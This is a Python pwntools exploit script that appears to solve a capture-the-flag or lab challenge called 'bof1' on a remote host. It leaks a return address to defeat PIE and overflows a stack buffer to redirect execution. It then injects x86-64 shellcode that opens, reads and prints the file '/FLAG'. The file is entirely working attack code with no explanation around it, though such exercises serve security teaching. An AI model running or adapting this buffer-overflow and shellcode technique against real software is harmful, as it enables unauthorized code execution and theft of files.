from pwn import *

context.arch = 'amd64'

elf_file = ELF('./bof1')
main_offset = elf_file.symbols['main']
msg_offset = elf_file.symbols['msg']
ret_offset = 0xc6
ret_off = main_offset + ret_offset 

io = remote('up.zoolab.org', 12342)

# Leak Return Address
leak_pad = b'X' * 56
io.sendafter(b"What's your name? ", leak_pad)
io.recvuntil(b"Welcome, ")

leaked_suffix = io.recvline(keepends=False)
ret_addr_bytes = leaked_suffix[len(leak_pad):]
if not ret_addr_bytes:
    io.close()
    exit(1)

full_ret_addr_bytes = ret_addr_bytes.ljust(8, b'\x00')
leaked_ret = u64(full_ret_addr_bytes)

# Calculate PIE Base & Target Address
pie_base_addr = leaked_ret - ret_off
if (pie_base_addr & 0xfff):
    io.close()
    exit(1)

shellcode_addr = pie_base_addr + msg_offset

# Overflow and overwrite return address
io.sendlineafter(b"What's the room number? ", b"0")

buf3_fill_len = 144     
dummy_rbp_val = 0x4142434445464748 
exploit_text = b'X' * buf3_fill_len
exploit_text += p64(dummy_rbp_val)
exploit_text += p64(shellcode_addr)

io.sendlineafter(b"What's the customer's name? ", exploit_text)
io.recvuntil(b"The customer's name is: "); 
io.recvline(timeout=0.5)

shellcode = """
    lea rdi, [rip+flag_str]
    xor esi, esi
    xor edx, edx
    mov eax, 2
    syscall         /* open */

    mov edi, eax
    lea rsi, [rip+fbuf]
    mov edx, 100
    xor eax, eax
    syscall         /* read */

    mov edx, eax
    mov edi, 1
    lea rsi, [rip+fbuf]
    mov eax, 1
    syscall         /* write */

    xor edi, edi
    mov eax, 60
    syscall         /* exit */

flag_str: .asciz "/FLAG"
fbuf:     .space 128
"""

actual_shellcode = asm(shellcode)
io.sendafter(b"Leave your message: ", actual_shellcode)
io.recvuntil(b"Thank you!\n") 

flag_data = io.recvall()
print(flag_data) 

io.close()